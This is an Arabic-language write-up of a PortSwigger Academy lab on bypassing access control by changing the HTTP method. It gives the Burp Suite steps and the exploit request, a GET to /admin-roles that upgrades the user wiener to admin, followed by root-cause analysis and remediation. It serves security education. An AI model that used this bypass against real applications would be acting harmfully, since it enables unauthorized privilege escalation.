# Lab 11 — Method-based Access Control Can Be Circumvented (تجاوز الصلاحيات بتغيير HTTP Method)

[![التصنيف](https://img.shields.io/badge/الفئة-Broken%20Access%20Control-red)]()
[![النوع](https://img.shields.io/badge/النوع-Vertical%20Broken%20Access%20Control%20(HTTP%20Method%20Bypass)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-عالي%20(High)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/access-control)

> هذا الشرح جزء من سلسلة [معامل التحكم في الوصول (BAC)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 11 — Method-based Access Control Can Be Circumvented (تجاوز الصلاحيات بتغيير HTTP Method) |
| **تصنيف الثغرة** | Vertical Broken Access Control (HTTP Method Bypass) |
| **معيار الضعف (CWE)** | CWE-650: Trusting HTTP Permission Methods on the Server Side |
| **مستوى الخطورة** | عالي (High) |
| **الهدف من اللاب** | ترقية حساب wiener إلى رتبة أدمن بتجاوز قيد الـ POST عبر استخدام طريقة GET أو تحويل الطلب. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

يقوم الأدمن بترقية المستخدمين عبر إرسال طلب `POST /admin-roles` مع بارامترات `username=wiener&action=upgrade`. قام المطور بوضع فحص الصلاحية الإدارية على مستوى مسار `POST` فقط في ملف التوجيه (مثل `@app.post('/admin-roles', admin_check)`).

**الخلل الفكري هنا:** كود معالجة الترقية (Controller) في الباك إند مكتوب بطريقة تستقبل المتغيرات سواء جاءت عبر `POST` أو `GET` (مثل استخدام `$_REQUEST` في PHP). عندما يطلب المستخدم العادي `POST /admin-roles` يمنعه السيرفر، ولكن عندما يحول الطلب إلى `GET /admin-roles?username=wiener&action=upgrade`، يتجاوز فلتر الفحص لأن الفلتر كان يراقب `POST` فقط!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يغير طريقة الطلب (HTTP Verb) من `POST` إلى `GET` مع تمرير نفس المتغيرات في الرابط للالتفاف على الفلتر المربوط بـ Verb محدد.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
ربط فحص الصلاحيات بطريقة HTTP معينة بدلاً من ربطها بوظيفة المعالجة الأساسية المنفذة في الباك إند.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. سجل دخولك كـ `administrator:admin`، وتوجه إلى لوحة الإدارة.
2. قم بترقية أي مستخدم (مثل carlos) والتقط الطلب في Burp Suite.
3. الطلب الأصلي يكون:
```http
POST /admin-roles HTTP/1.1
...
username=carlos&action=upgrade
```
4. أرسل الطلب إلى **Repeater**، وغير الكوكي لجلسة المستخدم العادي `wiener` واضغط Send، سيرد السيرفر بـ `401 Unauthorized`.
5. الآن، اضغط بزر الفأرة الأيمن داخل Repeater واختر **Change request method** (سيتحول الطلب إلى `GET` وتنتقل المتغيرات إلى الرابط):
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Cookie: session=wiener_session
```
6. اضغط Send، ستلاحظ أن السيرفر قبل الطلب ورد بـ `302 Found` وتمت ترقية wiener لأدمن بنجاح!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=wiener_session
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 302 Found
Location: /
...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

ترقية أي مستخدم عادي إلى مدير نظام بسبب إهمال حماية جميع طرق الـ HTTP البديلة.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

يجب أن تُربط الصلاحيات بالعملية البرمجية المنفذة داخل الـ Controller بغض النظر عن طريقة الإرسال، مع حظر استقبال أي طريقة HTTP غير مصرح بها صراحة للـ Endpoint.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — Access Control](https://portswigger.net/web-security/access-control)
- [OWASP Top 10 — A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE Database Details](https://cwe.mitre.org/)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
